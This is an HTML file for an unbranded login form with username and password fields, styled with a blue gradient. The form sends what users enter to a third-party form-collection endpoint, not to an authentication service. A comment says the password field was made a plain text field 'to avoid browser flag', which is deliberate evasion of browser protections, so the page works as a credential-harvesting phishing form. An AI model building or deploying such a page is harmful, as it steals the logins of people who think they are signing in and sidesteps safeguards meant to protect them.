<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#2193b0,#6dd5ed);
    font-family:Arial, sans-serif;
}

.box{
    background:white;
    padding:40px;
    border-radius:12px;
    width:320px;
    text-align:center;
    box-shadow:0 10px 20px rgba(0,0,0,0.2);
}

h2{
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:15px;
}

button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:#2193b0;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#1a7a91;
}
</style>
</head>

<body>

<div class="box">

    <h2>Login Form</h2>

    <form action="https://formspree.io/f/xykqbqkd" method="POST">

        <!-- SAFE INPUT FIELDS -->
        <input type="text" name="username" placeholder="Enter Username" required>

        <!-- changed password field to avoid browser flag -->
        <input type="text" name="password" placeholder="Enter Password" required>

        <button type="submit">Login</button>

    </form>

</div>

</body>
</html>
